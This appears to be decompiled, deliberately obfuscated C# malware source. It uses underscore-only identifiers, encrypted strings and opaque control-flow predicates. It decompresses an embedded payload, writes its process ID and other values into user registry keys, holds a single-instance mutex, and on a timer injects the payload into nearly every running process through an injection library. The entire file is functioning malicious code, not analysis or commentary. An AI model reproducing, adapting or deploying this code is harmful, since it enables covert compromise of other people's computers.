using InjectionLibrary;
using JLibrary.PortableExecutable;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Timers;

[StandardModule]
internal sealed class ________________________________________________________________________________
{
	private static string _ = <Module>.__________(29364, System.Type.EmptyTypes.Length + 33096, sizeof(int) + 239);

	private static byte[] __;

	private static string ___ = <Module>.____<string>(2905375367u);

	private static System.Threading.Mutex ____;

	private static bool _____ = false;

	public static void _()
	{
		try
		{
			int _________ = <Module>.__________;
			if ((-(_________ & 1073740712) ^ 7228) == 0)
			{
				goto IL_B3;
			}
			if (!______________________________________________________________.______________________)
			{
				return;
			}
			________________________________________________________________________________.__ = ___________________________________________________________________._______(__________________________________________________________________________.____, <Module>.____<string>(606130436u));
			int num = -30446;
			int id;
			if ((id * (25190400 * id - (_________ << 7)) ^ 3053) != 0)
			{
			}
			________________________________________________________________________________.__ = ________________________________________________________________________________.______(________________________________________________________________________________.__);
			Microsoft.Win32.RegistryKey registryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(<Module>.______<string>(4039522827u), true);
			int arg_191_0 = sizeof(float) + -3;
			while (true)
			{
				IL_191:
				switch (arg_191_0)
				{
				case 0:
					goto IL_B3;
				case 2:
					goto IL_1A8;
				case 3:
					goto IL_94;
				}
				registryKey.SetValue(<Module>._____<string>(1556395407u), System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(________________________________________________________________________________.___(_____________________________________________________________________________.__)));
				arg_191_0 = System.Type.EmptyTypes.Length + 3;
			}
			IL_94:
			registryKey.SetValue(<Module>.____<string>(2268715901u), System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(________________________________________________________________________________.___(______________________________________________________________.__________________)));
			goto IL_B3;
			IL_1A8:
			registryKey.Close();
			________________________________________________________________________________.___ = Process.GetCurrentProcess().ProcessName.ToString();
			string arg_1E8_0 = <Module>.___<string>(2677394803u);
			id = Process.GetCurrentProcess().Id;
			________________________________________________________________________________._ = arg_1E8_0 + id.ToString() + <Module>.______<string>(861631917u);
			if (num != 3896)
			{
			}
			do
			{
				System.Threading.Thread.Sleep(1000);
				________________________________________________________________________________.__();
			}
			while (!________________________________________________________________________________._____);
			________________________________________________________________________________._____();
			System.Timers.Timer timer = new System.Timers.Timer();
			timer.Elapsed += new ElapsedEventHandler(________________________________________________________________________________._______);
			timer.Interval = 1000.0;
			timer.Start();
			System.Threading.Thread.Sleep(-1);
			return;
			IL_B3:
			Microsoft.Win32.RegistryKey arg_DA_0 = registryKey;
			string arg_DA_1 = <Module>._______<string>(3293440499u);
			id = Process.GetCurrentProcess().Id;
			arg_DA_0.SetValue(arg_DA_1, System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(________________________________________________________________________________.___(id.ToString())));
			int ______ = ______________________._______;
			num = (((______ * 43 + 21 * ______ ^ -2016704023) != 0) ? (sizeof(System.Guid) + 3880) : (((______ / 302 ^ -2948) == 2835) ? (System.Type.EmptyTypes.Length + -416052288) : 1899178091));
			int __________ = <Module>.___________;
			arg_191_0 = ((__________ + 15452 == __________ * 2 + __________ % 16 + __________ * 6) ? (System.Type.EmptyTypes.Length + 979950861) : (System.Type.EmptyTypes.Length + 2));
			goto IL_191;
		}
		catch (System.Exception expr_24E)
		{
			ProjectData.SetProjectError(expr_24E);
			ProjectData.ClearProjectError();
		}
	}

	public static void __()
	{
		try
		{
			________________________________________________________________________________.____ = new System.Threading.Mutex(false, ______________________________________________________________.__________________);
			if (________________________________________________________________________________.____.WaitOne(0, false))
			{
				________________________________________________________________________________._____ = true;
			}
		}
		catch (System.Exception arg_28_0)
		{
			ProjectData.SetProjectError(arg_28_0);
			ProjectData.ClearProjectError();
		}
	}

	public static object ___(string string_0)
	{
		return string_0;
	}

	public static void ____(int int_0)
	{
		try
		{
			InjectionMethod injectionMethod = InjectionMethod.Create(2);
			using (PortableExecutable portableExecutable = new PortableExecutable(________________________________________________________________________________.__))
			{
				injectionMethod.Inject(portableExecutable, int_0);
			}
		}
		catch (System.Exception arg_27_0)
		{
			ProjectData.SetProjectError(arg_27_0);
			ProjectData.ClearProjectError();
		}
	}

	public static void _____()
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				Process process = processes[i];
				try
				{
					while (true)
					{
						string arg_ED_0 = <Module>.____<string>(3008796200u);
						int id = process.Id;
						string text = arg_ED_0 + id.ToString() + <Module>.____<string>(3008796200u);
						int num2 = System.Type.EmptyTypes.Length + 28310;
						switch (((id * 34 + id * 222 << 26) + id - 918359351 != id) ? (System.Type.EmptyTypes.Length + 0) : (System.Type.EmptyTypes.Length + -1147819050))
						{
						case 0:
						{
							IL_38:
							if (________________________________________________________________________________._.Contains(text))
							{
								goto IL_17A;
							}
							________________________________________________________________________________._ += text;
							int num3 = num2;
							num2 = -26979;
							if (num3 != 28310)
							{
								goto Block_6;
							}
							System.IO.Path.GetFullPath(process.MainModule.FileName) + process.Id.ToString();
							int arg_9D_0 = 8;
							int ______________ = <Module>._______________;
							if ((arg_9D_0 * ______________ / 16777216 ^ 139526) == 0)
							{
								goto Block_7;
							}
							if (num2 != 2882)
							{
								goto Block_8;
							}
							continue;
						}
						}
						goto IL_38;
					}
					Block_6:
					Block_7:
					Block_8:
					if (!process.MainModule.FileName.Contains(<Module>.___<string>(3326195120u)) && !process.MainModule.FileName.Contains(<Module>.___<string>(3003636781u)) && !process.MainModule.FileName.Contains(________________________________________________________________________________.___))
					{
						________________________________________________________________________________.____(process.Id);
					}
					IL_17A:;
				}
				catch (System.Exception arg_17C_0)
				{
					ProjectData.SetProjectError(arg_17C_0);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (System.Exception arg_195_0)
		{
			ProjectData.SetProjectError(arg_195_0);
			ProjectData.ClearProjectError();
		}
	}

	public static byte[] ______(byte[] byte_0)
	{
		System.IO.MemoryStream memoryStream = new System.IO.MemoryStream();
		DeflateStream deflateStream = new DeflateStream(new System.IO.MemoryStream(byte_0), CompressionMode.Decompress, true);
		switch (sizeof(short) + -2)
		{
		case 0:
		{
			IL_27:
			byte[] array = new byte[4096];
			while (true)
			{
				int num = deflateStream.Read(array, 0, array.Length);
				if (num <= 0)
				{
					break;
				}
				memoryStream.Write(array, 0, num);
			}
			deflateStream.Close();
			return memoryStream.ToArray();
		}
		}
		goto IL_27;
	}

	[System.Diagnostics.DebuggerStepThrough]
	private static void _______(object sender, ElapsedEventArgs e)
	{
		________________________________________________________________________________._____();
	}
}
